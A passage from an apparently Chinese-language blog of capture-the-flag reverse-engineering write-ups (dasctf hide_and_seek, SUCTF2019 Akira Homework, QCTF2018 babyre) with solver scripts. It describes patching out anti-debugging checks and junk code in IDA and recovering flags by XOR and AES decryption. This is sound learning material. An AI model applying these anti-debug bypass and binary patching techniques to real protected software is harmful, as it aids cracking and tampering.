class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 奇数位要么等于0x54要么等于0x52</span></span><br><span class="line"><span class="comment"># 偶数位0x4e 0x59</span></span><br><span class="line"></span><br><span class="line">a=[<span class="number">0x2</span>, <span class="number">0xc</span>, <span class="number">0x1a</span>, <span class="number">0x14</span>, <span class="number">0xd</span>, <span class="number">0xf</span>, <span class="number">0xb</span>, <span class="number">0x10</span>, <span class="number">0xc</span>, <span class="number">0xc</span>, <span class="number">0xf</span>, <span class="number">0xd</span>, <span class="number">0x13</span>, <span class="number">0xa</span>, <span class="number">0x12</span>, <span class="number">0x10</span>, <span class="number">0x1</span>, <span class="number">0x8</span>, <span class="number">0x11</span>, <span class="number">0x19</span>, <span class="number">0x18</span>, <span class="number">0x16</span>, <span class="number">0x18</span>, <span class="number">0x18</span>, <span class="number">0xe</span>, <span class="number">0x6</span>, <span class="number">0x5</span>, <span class="number">0x12</span>, <span class="number">0x18</span>, <span class="number">0x5</span>, <span class="number">0x6</span>, <span class="number">0x2</span>, <span class="number">0x1</span>, <span class="number">0xd</span>, <span class="number">0x14</span>, <span class="number">0x64</span>,]</span><br><span class="line"></span><br><span class="line">b=[<span class="number">0x8</span>, <span class="number">0x16</span>, <span class="number">0x1a</span>, <span class="number">0x1c</span>, <span class="number">0x18</span>, <span class="number">0x1c</span>, <span class="number">0xb</span>, <span class="number">0x12</span>, <span class="number">0x12</span>, <span class="number">0x1b</span>, <span class="number">0x1b</span>, <span class="number">0x18</span>, <span class="number">0x1c</span>, <span class="number">0x17</span>, <span class="number">0x18</span>, <span class="number">0x19</span>, <span class="number">0x9</span>, <span class="number">0xf</span>, <span class="number">0x18</span>, <span class="number">0x1a</span>, <span class="number">0x18</span>, <span class="number">0x17</span>, <span class="number">0x1a</span>, <span class="number">0x19</span>, <span class="number">0x17</span>, <span class="number">0x10</span>, <span class="number">0x19</span>, <span class="number">0x1d</span>, <span class="number">0x1e</span>, <span class="number">0x13</span>, <span class="number">0x1a</span>, <span class="number">0x17</span>, <span class="number">0x12</span>, <span class="number">0x18</span>, <span class="number">0x1d</span>, <span class="number">0xc8</span>,]</span><br><span class="line"></span><br><span class="line">c=[<span class="number">0xd</span>, <span class="number">0x19</span>, <span class="number">0xd</span>, <span class="number">0x2e</span>, <span class="number">0xc</span>, <span class="number">0x2b</span>, <span class="number">0x2a</span>, <span class="number">0x4</span>, <span class="number">0x16</span>, <span class="number">0x2e</span>, <span class="number">0x16</span>, <span class="number">0x23</span>, <span class="number">0x24</span>, <span class="number">0xc</span>, <span class="number">0x18</span>, <span class="number">0xc</span>, <span class="number">0x30</span>, <span class="number">0x8</span>, <span class="number">0x18</span>, <span class="number">0x1d</span>, <span class="number">0x29</span>, <span class="number">0x7</span>, <span class="number">0xf</span>, <span class="number">0x6</span>, <span class="number">0x15</span>, <span class="number">0x2</span>, <span class="number">0x1e</span>, <span class="number">0x13</span>, <span class="number">0xa</span>, <span class="number">0x21</span>, <span class="number">0x26</span>, <span class="number">0x5</span>, <span class="number">0x16</span>, <span class="number">0x13</span>, <span class="number">0x28</span>, <span class="number">0x69636544</span>, <span class="number">0x6e6f6973</span>, <span class="number">0x6572745f</span>, <span class="number">0x72705f65</span>, <span class="number">0x696e6e75</span>, <span class="number">0x676e</span>, <span class="number">0x0</span>,]</span><br><span class="line">d = []</span><br><span class="line">target=<span class="number">0xd66</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">35</span>):</span><br><span class="line">    d.append(c[i]*(b[i]-a[i]))</span><br><span class="line">s = Solver()</span><br><span class="line">v = [BitVec(<span class="string">&#x27;v%d&#x27;</span>%i,<span class="number">32</span>) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">35</span>)]</span><br><span class="line">vv = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">35</span>)]</span><br><span class="line">summ = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">35</span>):</span><br><span class="line">    summ+=v[i]*d[i]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">35</span>):</span><br><span class="line">    s.add(v[i]&gt;=<span class="number">0</span>)</span><br><span class="line">    s.add(v[i]&lt;<span class="number">2</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">35</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(a[i],b[i]):</span><br><span class="line">        vv[j]+=c[i]*v[i]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">35</span>):</span><br><span class="line">    s.add(vv[i]&lt;<span class="number">150</span>)</span><br><span class="line"></span><br><span class="line">s.add(summ==target)</span><br><span class="line">res = []</span><br><span class="line">flag = []</span><br><span class="line"><span class="keyword">if</span> s.check()==sat:</span><br><span class="line">    m = s.model()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> v:</span><br><span class="line">        res.append(m[i].as_long())</span><br><span class="line">        <span class="keyword">if</span> m[i].as_long()==<span class="number">1</span>:</span><br><span class="line">            flag.append(<span class="number">0x59</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            flag.append(<span class="number">0x4e</span>)</span><br><span class="line">print(res)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">35</span>):</span><br><span class="line">    <span class="keyword">if</span> (i&amp;<span class="number">1</span>)==<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">if</span> flag[i]==<span class="number">0x4e</span>:</span><br><span class="line">            flag[i]=<span class="number">0x52</span></span><br><span class="line">        <span class="keyword">else</span>: flag[i]=<span class="number">0x54</span></span><br><span class="line">print(bytes(flag))</span><br></pre></td></tr></table></figure>

<h2 id="dasctf-hide-and-seek"><a href="#dasctf-hide-and-seek" class="headerlink" title="[dasctf]hide_and_seek"></a>[dasctf]hide_and_seek</h2><ol>
<li>入口不是真入口，通过调试找到了真正的入口</li>
<li>patch掉反调试，patch掉花指令，patch掉无用函数</li>
</ol>
<p>去除无用函数脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">start = <span class="number">0x4020b3</span></span><br><span class="line">end = <span class="number">0x402db9</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(start,end):</span><br><span class="line">    <span class="keyword">if</span> Byte(i)==<span class="number">0xe8</span>:</span><br><span class="line">        addr=Dword(i+<span class="number">1</span>)+i+<span class="number">5</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;patching %x&quot;</span>%addr</span><br><span class="line">        <span class="keyword">if</span> Byte(addr)==<span class="number">0xc3</span>:</span><br><span class="line">            patch_byte(i,<span class="number">0x90</span>)</span><br><span class="line">            patch_byte(i+<span class="number">1</span>,<span class="number">0x90</span>)</span><br><span class="line">            patch_byte(i+<span class="number">2</span>,<span class="number">0x90</span>)</span><br><span class="line">            patch_byte(i+<span class="number">3</span>,<span class="number">0x90</span>)</span><br><span class="line">            patch_byte(i+<span class="number">4</span>,<span class="number">0x90</span>)</span><br></pre></td></tr></table></figure>

<p>大概是通过异常处理找到main函数，最后是异或了一组数，像是rc4加密</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;setjmp.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printArray</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *name,<span class="keyword">uint8_t</span> *v,<span class="keyword">size_t</span> len)</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;========%s=========\n&quot;</span>,name);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> i=<span class="number">0</span>;i&lt;len;i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%02X,&quot;</span>,v[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n=================\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> target = <span class="number">0x19B66C9FEF431</span>ull;</span><br><span class="line">    <span class="keyword">uint8_t</span> flag[<span class="number">256</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    target^=<span class="number">0xDEADBEEF</span>;</span><br><span class="line">    target^=<span class="number">0xBADBEEF</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> i=<span class="number">6</span>;i&lt;<span class="number">8</span>;i--)&#123;</span><br><span class="line">        flag[i]=target&amp;<span class="number">0x7f</span>;</span><br><span class="line">        target&gt;&gt;=<span class="number">7</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">uint8_t</span> result[] = &#123;<span class="number">0x75</span>,<span class="number">0x93</span>,<span class="number">0xAB</span>,<span class="number">0xF2</span>,<span class="number">0x1B</span>,<span class="number">0x54</span>,<span class="number">0x36</span>,<span class="number">0x83</span>,<span class="number">0xDF</span>,<span class="number">0xE8</span>,<span class="number">0x35</span>,<span class="number">0x51</span>,<span class="number">0x61</span>,<span class="number">0xB7</span>,<span class="number">0xC0</span>,<span class="number">0x1C</span>,<span class="number">0x29</span>,<span class="number">0x50</span>,<span class="number">0x9E</span>,<span class="number">0xCD</span>,<span class="number">0x38</span>,<span class="number">0x67</span>,<span class="number">0xA2</span>,<span class="number">0x11</span>,<span class="number">0x4F</span>,<span class="number">0x8A</span>,<span class="number">0xF9</span>,<span class="number">0x24</span>,<span class="number">0x61</span>,<span class="number">0xA1</span>,<span class="number">0x0C</span>,<span class="number">0x7B</span>,<span class="number">0xB6</span>,<span class="number">0xE5</span>,<span class="number">0x72</span>,<span class="number">0x82</span>&#125;;</span><br><span class="line">    <span class="keyword">uint8_t</span> xorData[<span class="number">256</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">char</span> input[] = <span class="string">&quot;flag&#123;h1aaaaaaaaaaaaaaaaaaaaaaaaaaaa&#125;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> i=<span class="number">0</span>;i&lt;<span class="built_in">strlen</span>(input);i++)&#123;</span><br><span class="line">        xorData[i]=input[i]^result[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">uint8_t</span> f[] = &#123;<span class="number">0x75</span>,<span class="number">0x93</span>,<span class="number">0xAB</span>,<span class="number">0xF2</span>,<span class="number">0x1B</span>,<span class="number">0x54</span>,<span class="number">0x36</span>,<span class="number">0x86</span>,<span class="number">0x8D</span>,<span class="number">0xD6</span>,<span class="number">0x35</span>,<span class="number">0x5E</span>,<span class="number">0x64</span>,<span class="number">0x89</span>,<span class="number">0xD2</span>,<span class="number">0x4E</span>,<span class="number">0x7B</span>,<span class="number">0x5A</span>,<span class="number">0xA0</span>,<span class="number">0xEB</span>,<span class="number">0x0A</span>,<span class="number">0x59</span>,<span class="number">0xA5</span>,<span class="number">0x41</span>,<span class="number">0x40</span>,<span class="number">0x8F</span>,<span class="number">0xC7</span>,<span class="number">0x31</span>,<span class="number">0x68</span>,<span class="number">0xF3</span>,<span class="number">0x32</span>,<span class="number">0x77</span>,<span class="number">0xB6</span>,<span class="number">0xB5</span>,<span class="number">0x7D</span>,<span class="number">0x82</span>,<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> i=<span class="number">0</span>;i&lt;<span class="number">0x24</span>;i++)&#123;</span><br><span class="line">        f[i]^=xorData[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,f);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="rev-SUCTF2019-Akira-Homework"><a href="#rev-SUCTF2019-Akira-Homework" class="headerlink" title="[rev][SUCTF2019]Akira Homework"></a>[rev][SUCTF2019]Akira Homework</h2><p>同时看两份答案才勉强看懂</p>
<p>TLS回调在进程创建、结束，线程创建、结束偶会有回调</p>
<p>C语言中::Src代表访问名为Src的全局变量，避免和局部变量混淆</p>
<ol>
<li><p>有一段password，按照指定格式异或置换即可</p>
</li>
<li><p>从signature文件流读取文件，<br>这个写入文件流总是不成功，于是直接把冒号改成a，改成从文件读取就好了</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> 1.txt &gt;&gt; WinRev.exe:signature</span><br></pre></td></tr></table></figure>

<p>后进行md5校验</p>
</li>
<li><p>IDA Ctrl+E可以查看程序所有入口</p>
</li>
<li><p>TLS回调里面有个反调试和字符串解密</p>
</li>
<li><p>调试调着调着就退出了，猜测是主函数创建多线程搞得鬼，在副线程函数处下断调试，发现有个枚举进程名，然后进程了进程名的md5比对，调试发现如果是ida64.exe就退出</p>
<p> 我tm直接改成jmp</p>
<p> sub_14008500里面还是有反调试</p>
</li>
<li><p>反调试这里有个只执行一次的函数，还不清楚是什么</p>
</li>
<li><p>WaitForMultipleObjects是程序接收信号的位置，258代表睡眠超时信号，使用这个结合多线程可以实现基于时间的反调试</p>
</li>
<li><p>然后后面有map一个dll进内存，查看map的dll，可以看到mz文件头，就是可执行文件头，dump内存，可以通过字符串找到主函数</p>
</li>
<li><p>之后可以查看到AES加密，密钥很明显，密文在sub_14009850的Src中</p>
<p>这个是因为dump下的内存中，sub_180002880打开的是名为SharedMemory的映射，并且子线程中SharedMemory的数据很明显了</p>
</li>
</ol>
<p>唔，还是需要学习呀</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="comment"># from z3 import *</span></span><br><span class="line"></span><br><span class="line"><span class="comment">############## 第一个密码</span></span><br><span class="line">a = [<span class="number">1</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">0</span>]</span><br><span class="line">b = [<span class="number">106</span>, <span class="number">90</span>, <span class="number">101</span>, <span class="number">107</span>, <span class="number">113</span>, <span class="number">65</span>, <span class="number">114</span>, <span class="number">104</span>, <span class="number">85</span>, <span class="number">124</span>, <span class="number">57</span>, <span class="number">103</span>, <span class="number">62</span>, <span class="number">48</span>, <span class="number">79</span>, <span class="number">125</span>, <span class="number">124</span>, <span class="number">100</span>]</span><br><span class="line">rb = [<span class="number">0</span>]*len(b)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(b)):</span><br><span class="line">    rb[<span class="number">6</span>*(i//<span class="number">6</span>)+a[i%<span class="number">6</span>]]=b[i]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(rb)):</span><br><span class="line">    rb[i]^=i</span><br><span class="line">print(bytes(rb))</span><br><span class="line"></span><br><span class="line"><span class="comment">############# 第二个密码</span></span><br><span class="line">k = [<span class="number">0x67452301</span>,<span class="number">0xEFCDAB89</span>,<span class="number">0x98BADCFE</span>,<span class="number">0x10325476</span>]</span><br><span class="line">key = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> k:</span><br><span class="line">    key.append(i&amp;<span class="number">0xff</span>)</span><br><span class="line">    key.append((i&gt;&gt;<span class="number">8</span>)&amp;<span class="number">0xff</span>)</span><br><span class="line">    key.append((i&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xff</span>)</span><br><span class="line">    key.append(i&gt;&gt;<span class="number">24</span>)</span><br><span class="line">key = bytes(key)</span><br><span class="line">c = [<span class="number">0xFC</span>,<span class="number">0xAE</span>,<span class="number">0xEB</span>,<span class="number">0x6E</span>,<span class="number">0x34</span>,<span class="number">0xB4</span>,<span class="number">0x30</span>,<span class="number">0x3E</span>,<span class="number">0x99</span>,<span class="number">0xB9</span>,<span class="number">0x12</span>,<span class="number">6</span>,<span class="number">0xBD</span>,<span class="number">0x32</span>,<span class="number">0x5F</span>,<span class="number">0x2B</span>]</span><br><span class="line">c = bytes(c)</span><br><span class="line">print(base64.b16encode(c))</span><br><span class="line"></span><br><span class="line"><span class="comment">################ 修改dump后的文件</span></span><br><span class="line">data = []</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&quot;winrev_dmp.dll&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = f.read()</span><br><span class="line">data = data[<span class="number">0x1a0</span>:]</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&quot;winrev_newdump.dll&quot;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(bytes(data))</span><br><span class="line"></span><br><span class="line"><span class="comment">################ 解密flag</span></span><br><span class="line"></span><br><span class="line">Src = [<span class="number">0</span>]*<span class="number">16</span></span><br><span class="line">Src[<span class="number">0</span>] = <span class="number">0x94</span></span><br><span class="line">Src[<span class="number">1</span>] = <span class="number">0xBF</span></span><br><span class="line">Src[<span class="number">2</span>] = <span class="number">0x7A</span></span><br><span class="line">Src[<span class="number">3</span>] = <span class="number">0xC</span></span><br><span class="line">Src[<span class="number">4</span>] = <span class="number">0xA4</span></span><br><span class="line">Src[<span class="number">5</span>] = <span class="number">0x35</span></span><br><span class="line">Src[<span class="number">6</span>] = <span class="number">0x50</span></span><br><span class="line">Src[<span class="number">7</span>] = <span class="number">0xD1</span></span><br><span class="line">Src[<span class="number">8</span>] = <span class="number">0xC2</span></span><br><span class="line">Src[<span class="number">9</span>] = <span class="number">0x15</span></span><br><span class="line">Src[<span class="number">10</span>] = <span class="number">0xEC</span></span><br><span class="line">Src[<span class="number">11</span>] = <span class="number">0xEF</span></span><br><span class="line">Src[<span class="number">12</span>] = <span class="number">0x9D</span></span><br><span class="line">Src[<span class="number">13</span>] = <span class="number">0x9A</span></span><br><span class="line">Src[<span class="number">14</span>] = <span class="number">0xAA</span></span><br><span class="line">Src[<span class="number">15</span>] = <span class="number">0x56</span></span><br><span class="line">Src = bytes(Src)</span><br><span class="line">key = <span class="string">b&#x27;Ak1i3aS3cre7K3y\x00&#x27;</span></span><br><span class="line">aes = AES.new(key=key,mode=AES.MODE_ECB)</span><br><span class="line">p = aes.decrypt(Src)</span><br><span class="line">print(p)</span><br></pre></td></tr></table></figure>

<p>参考</p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6042#toc-9">https://xz.aliyun.com/t/6042#toc-9</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41252520/article/details/100738585">https://blog.csdn.net/qq_41252520/article/details/100738585</a></p>
<p><a target="_blank" rel="noopener" href="https://www.52pojie.cn/thread-1039478-1-1.html#28221000_akira-homework">https://www.52pojie.cn/thread-1039478-1-1.html#28221000_akira-homework</a></p>
<h2 id="rev-QCTF2018-babyre"><a href="#rev-QCTF2018-babyre" class="headerlink" title="[rev][QCTF2018]babyre"></a>[rev][QCTF2018]babyre</h2><p>有个关键函数，直接看汇编没什么头绪，看答案了</p>
<p>rust语言逆向</p>
<ol>
<li>通过IDAView可以查看函数大概流程</li>
<li>既然是处理，又不是超大函数，那基本上肯定有cmp指令，之后就会有分支，那这里就是关键点</li>
<li>然后经过三个处理函数，最后进行检测</li>
</ol>
<h3 id="第一个处理函数"><a href="#第一个处理函数" class="headerlink" title="第一个处理函数"></a>第一个处理函数</h3><p>分析出两个函数，都是获取指定偏移的地址，于是可以发现变换规律：</p>
<p>4个为一组进行移位</p>
<p>2–&gt;0 3–&gt;2 0–&gt;1 1–&gt;3</p>
<p>逆变换就是 0–&gt;2 1–&gt;0 3–&gt;1 2–&gt;3</p>
<h3 id="第二个处理函数"><a href="#第二个处理函数" class="headerlink" title="第二个处理函数"></a>第二个处理函数</h3><p>4个为一组，单个字符变换</p>
<p>3: -127 4: +7 5: +18 6: +88</p>
<h3 id="第三个处理函数"><a href="#第三个处理函数" class="headerlink" title="第三个处理函数"></a>第三个处理函数</h3><p>9: ror 2 10: ror 7 11: ror 4 12: ror 5</p>
<p>比对函数里面有一串字节序列，应该就是要比对的数据了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">target=[<span class="number">0</span>]*<span class="number">32</span></span><br><span class="line">target[<span class="number">0</span>] = <span class="number">0xDA</span></span><br><span class="line">target[<span class="number">1</span>] = <span class="number">0xD8</span></span><br><span class="line">target[<span class="number">2</span>] = <span class="number">0x3D</span></span><br><span class="line">target[<span class="number">3</span>] = <span class="number">0x4C</span></span><br><span class="line">target[<span class="number">4</span>] = <span class="number">0xE3</span></span><br><span class="line">target[<span class="number">5</span>] = <span class="number">0x63</span></span><br><span class="line">target[<span class="number">6</span>] = <span class="number">0x97</span></span><br><span class="line">target[<span class="number">7</span>] = <span class="number">0x3D</span></span><br><span class="line">target[<span class="number">8</span>] = <span class="number">0xC1</span></span><br><span class="line">target[<span class="number">9</span>] = <span class="number">0x91</span></span><br><span class="line">target[<span class="number">10</span>] = <span class="number">0x97</span></span><br><span class="line">target[<span class="number">11</span>] = <span class="number">0xE</span></span><br><span class="line">target[<span class="number">12</span>] = <span class="number">0xE3</span></span><br><span class="line">target[<span class="number">13</span>] = <span class="number">0x5C</span></span><br><span class="line">target[<span class="number">14</span>] = <span class="number">0x8D</span></span><br><span class="line">target[<span class="number">15</span>] = <span class="number">0x7E</span></span><br><span class="line">target[<span class="number">16</span>] = <span class="number">0x5B</span></span><br><span class="line">target[<span class="number">17</span>] = <span class="number">0x91</span></span><br><span class="line">target[<span class="number">18</span>] = <span class="number">0x6F</span></span><br><span class="line">target[<span class="number">19</span>] = <span class="number">0xFE</span></span><br><span class="line">target[<span class="number">20</span>] = <span class="number">0xDB</span></span><br><span class="line">target[<span class="number">21</span>] = <span class="number">0xD0</span></span><br><span class="line">target[<span class="number">22</span>] = <span class="number">0x17</span></span><br><span class="line">target[<span class="number">23</span>] = <span class="number">0xFE</span></span><br><span class="line">target[<span class="number">24</span>] = <span class="number">0xD3</span></span><br><span class="line">target[<span class="number">25</span>] = <span class="number">0x21</span></span><br><span class="line">target[<span class="number">26</span>] = <span class="number">0x99</span></span><br><span class="line">target[<span class="number">27</span>] = <span class="number">0x4B</span></span><br><span class="line">target[<span class="number">28</span>] = <span class="number">0x73</span></span><br><span class="line">target[<span class="number">29</span>] = <span class="number">0xD0</span></span><br><span class="line">target[<span class="number">30</span>] = <span class="number">0xAB</span></span><br><span class="line">target[<span class="number">31</span>] = <span class="number">0xFE</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">    t = target[(i*<span class="number">4</span>+<span class="number">9</span>)&amp;<span class="number">0x1f</span>]</span><br><span class="line">    target[(i*<span class="number">4</span>+<span class="number">9</span>)&amp;<span class="number">0x1f</span>]=((t&lt;&lt;<span class="number">2</span>)|(t&gt;&gt;<span class="number">6</span>))&amp;<span class="number">0xff</span></span><br><span class="line">    t=target[(i*<span class="number">4</span>+<span class="number">10</span>)&amp;<span class="number">0x1f</span>]</span><br><span class="line">    target[(i*<span class="number">4</span>+<span class="number">10</span>)&amp;<span class="number">0x1f</span>]=((t&gt;&gt;<span class="number">1</span>)|(t&lt;&lt;<span class="number">7</span>))&amp;<span class="number">0xff</span></span><br><span class="line">    t=target[(i*<span class="number">4</span>+<span class="number">11</span>)&amp;<span class="number">0x1f</span>]</span><br><span class="line">    target[(i*<span class="number">4</span>+<span class="number">11</span>)&amp;<span class="number">0x1f</span>]=((t&gt;&gt;<span class="number">4</span>)|(t&lt;&lt;<span class="number">4</span>))&amp;<span class="number">0xff</span></span><br><span class="line">    t=target[(i*<span class="number">4</span>+<span class="number">12</span>)&amp;<span class="number">0x1f</span>]</span><br><span class="line">    target[(i*<span class="number">4</span>+<span class="number">12</span>)&amp;<span class="number">0x1f</span>]=((t&gt;&gt;<span class="number">3</span>)|(t&lt;&lt;<span class="number">5</span>))&amp;<span class="number">0xff</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">    t = target[(i*<span class="number">4</span>+<span class="number">3</span>)&amp;<span class="number">0x1f</span>]</span><br><span class="line">    target[(i*<span class="number">4</span>+<span 